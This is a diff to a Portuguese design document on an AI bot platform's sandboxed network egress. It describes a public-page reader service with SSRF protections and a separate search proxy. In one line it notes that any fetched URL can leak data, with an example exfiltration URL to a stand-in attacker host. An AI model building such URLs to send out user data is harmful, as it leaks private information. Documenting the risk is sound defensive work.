@@ -58,6 +58,17 @@ Em desenvolvimento (worker no host): o proxy escuta no endereço do host na pont
 
 `env` dentro do contêiner mostra `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY` (e as minúsculas) com a credencial do proxy, `NO_PROXY` vazio, e as variáveis da imagem (`HOME`, `PATH`, `LANG`...). Nada do servidor: nem `DATABASE_URL`, nem a chave do cofre, nem o token do servidor.
 
+## A leitura de páginas e a busca não passam pela lista do bot
+
+[BUSCA.md](BUSCA.md) descreve `web_search` e `web_read`. Duas exceções **explícitas** a "a saída é só pela lista do bot", ambas decididas pelo dono:
+
+- **`web_read` vai pelo serviço leitor, não pela lista do bot.** O leitor é um contêiner à parte (ou o próprio worker, sem Docker) que baixa **páginas públicas** por nome de host, **sem cartão**: só GET, sem cookies, sem segredo do usuário, só portas 80 e 443, e recusa IP literal e qualquer nome que resolva (depois do DNS, resolvido uma vez) para faixa privada, de loopback, link-local, de metadados ou reservada; cada redirecionamento é conferido de novo. O universo de sites é aberto (cada página puxa recursos de terceiros), por isso a lista de nomes exatos não cabe nele. **A máquina do bot continua só com a lista** e com os cartões; o leitor não lhe dá saída nenhuma. O dono pode desligar o leitor (`web.reader.enabled: false`): então `web_read` lê pela máquina do bot, **pela lista e com cartões**.
+- **A busca sai por um proxy próprio.** O SearXNG vive numa rede interna sozinho e só sai por um proxy do worker (a mesma classe `EgressProxy`) com uma lista fixa: os hosts exatos dos motores ligados. Não toca a lista dos bots.
+
+O proxy ganhou dois modos para isso (`packages/sandbox/src/egress/proxy.ts`, com testes): `openWeb` (qualquer **nome** público; o resto da regra continua: sem IP literal, só as portas, endereço resolvido público e conexão ao endereço validado) para o navegador do renderizador, e `anonymousSubject` (sem credencial, lista fixa) para o proxy de motores. Os bots nunca usam nenhum dos dois.
+
+**O que isto abre:** como a leitura pública não pede cartão, uma URL lida é um canal de saída (`https://atacante.exemplo/?dado=...`). Está em BUSCA.md, "O que isto NÃO impede".
+
 ## Conectores stdio
 
 Veja [CONECTORES.md](CONECTORES.md). Com o sandbox `docker`, cada conector stdio roda **num contêiner próprio**, na mesma rede interna, e sai pelo mesmo proxy com a lista **dos padrões + `egressHosts` do conector**. Conector novo que precisa de um host: `suup connectors set-egress <nome> --host api.exemplo.com`. Não há cartão para conector (não há execução para pausar): a recusa fica registrada em `network_events` (sujeito `connector`) e o servidor costuma dizê-la no erro da chamada; ainda não há comando nem tela que liste as recusas de um conector (adiado). Quem libera é o usuário.
